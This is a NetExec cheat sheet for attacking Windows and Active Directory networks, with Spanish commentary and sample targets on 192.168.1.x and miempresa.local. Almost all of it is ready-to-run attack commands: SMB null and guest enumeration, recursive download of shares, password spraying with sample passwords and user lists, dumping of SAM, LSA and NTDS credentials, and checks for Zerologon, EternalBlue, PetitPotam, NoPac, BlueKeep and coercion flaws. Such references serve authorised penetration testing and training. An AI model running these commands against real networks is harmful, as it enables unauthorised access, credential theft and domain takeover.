<h1 align="center">NetExec Cheat Sheet</h1>

<p align="center">
  Fast reference guide for network enumeration, credential stuffing, Active Directory assessment, and post-exploitation workflows.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Linux-111827?style=for-the-badge&logo=linux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/NetExec-AD_Exploit-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Network-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

## Enumeration null sesion / guest

```
nxc smb 192.168.1.50 -u '' -p ''
```

```
nxc smb 192.168.1.50 -u '' -p '' --shares
```

```
nxc smb 192.168.1.50 -u '' -p '' --users
```

```
nxc smb 192.168.1.50 -u 'guest' -p '' --local-auth
```

```
nxc smb 192.168.1.50 -u 'guest' -p '' --local-auth --shares
```

## Download Shares
```
nxc smb 192.168.1.0/24 -u 'juan.perez' -p 'Primavera2026*' -d miempresa.local -M spider_plus -o OUTPUT_DIR=/tmp/spider_results
```
> recorre los recursos compartidos, mapea de forma recursiva cada archivo y carpeta que encuentra, y genera un reporte estructurado en formato .json dentro de la carpeta /tmp/spider_results.
```
nxc smb 192.168.1.0/24 -u 'juan.perez' -p 'Primavera2026*' -d miempresa.local -M spider_plus -o EXCLUDE_SHARES="print$,IPC$,ADMIN$" OUTPUT_DIR=/tmp/spider_limpio
```
> En redes grandes, las carpetas de impresoras (print$) o de comunicación entre sistemas (IPC$) ralentizan el proceso y no suelen tener datos útiles. Con este comando las ignoras por completo:

## Password Spraying

```
nxc smb 192.168.1.0/24 -u 'Administrator' -p 'Password01' --local-auth
```

```
nxc smb 192.168.1.10 -u 'juan.perez' -p 'Password01' -d miempresa.local
```

```
nxc smb 192.168.1.10 -u /ruta/usuarios.txt -p 'Marzo2026!' -d miempresa.local --continue-on-success
```

```
nxc smb 192.168.1.0/24 -u /ruta/usuarios.txt -p 'Admin2026*' --local-auth --continue-on-success
```

```
nxc smb 192.168.1.10 -u /ruta/usuarios.txt -p '' -d miempresa.local --user-as-pass --continue-on-success
```
>Comprueba mismo usuario y contraseña

## Enumetarion users

```
nxc smb 192.168.1.50 -u 'user1' -p 'Password123' --local-auth --users
```

```
nxc smb 192.168.1.10 -u 'user1' -p 'Password123' -d miempresa.local --users
```

## Dump hash and Credentials

```
nxc smb 192.168.1.50 -u 'Administrator' -p 'ClaveLocal123!' --local-auth --sam
```

```
nxc smb 192.168.1.10 -u 'DomainAdmin' -p 'ClaveDominio2026*' -d miempresa.local --ntds
```

```
nxc smb 192.168.1.50 -u 'Administrador' -p 'ClaveLocal123!' --local-auth --lsa
```

```
nxc smb 192.168.1.0/24 -u 'admin.dominio' -p 'ClaveDominio2026*' -d miempresa.local --lsa
```

# Verificar si los equipos son vulnerables a PetitPotam (MS-EFSRPC)
```
nxc smb 192.168.1.0/24 -M petitpotam
```
# Verificar si el Controlador de Dominio es vulnerable a Zerologon (CVE-2020-1472)
```
nxc smb 192.168.1.10 -M zerologon
```
# Verificar si los sistemas Windows son vulnerables a EternalBlue (MS17-010)
```
nxc smb 192.168.1.0/24 -M eternalblue
```
# Verificar si las máquinas son vulnerables a NoPac (CVE-2021-42278 / CVE-2021-42287)
```
nxc smb 192.168.1.0/24 -M nopac
```
# Verificar vulnerabilidad BlueKeep (CVE-2019-0708) en el protocolo RDP (Escritorio Remoto)
```
nxc rdp 192.168.1.0/24 -M bluekeep
```
# Verificar vulnerabilidad SpoolFool (CVE-2022-21999 - Privilegios locales mediante la cola de impresión)
```
nxc smb 192.168.1.0/24 -M spoolfool
```
# Verificar vulnerabilidad WebDav (Busca si el servicio WebClient está activo, ideal para ataques NTLM Relay)
```
nxc smb 192.168.1.0/24 -M webdav
```
# Verificar si LAPS (Local Administrator Password Solution) está instalado y configurado
```
nxc smb 192.168.1.0/24 -M laps
```
# Verificar si los equipos tienen activado el protocolo obsoleto y peligroso SMBv1
```
nxc smb 192.168.1.0/24 -M smbv1
```
# Comprobar si las máquinas permiten sesiones anónimas mediante RPC (Null Sessions avanzadas)
```
nxc smb 192.168.1.0/24 -M rpcblanksystem
```
# Verificar vulnerabilidad dfscoerce (Abusa del protocolo DFS para forzar autenticación)
```
nxc smb 192.168.1.0/24 -M dfscoerce
```
# Verificar vulnerabilidad shadowcoerce (Abusa de los servicios de copia de sombra de volumen - VSS)
```
nxc smb 192.168.1.0/24 -M shadowcoerce
```
# Verificar vulnerabilidad printerbug (El clásico fallo del servicio de impresión de Windows)
```
nxc smb 192.168.1.0/24 -M printerbug
```
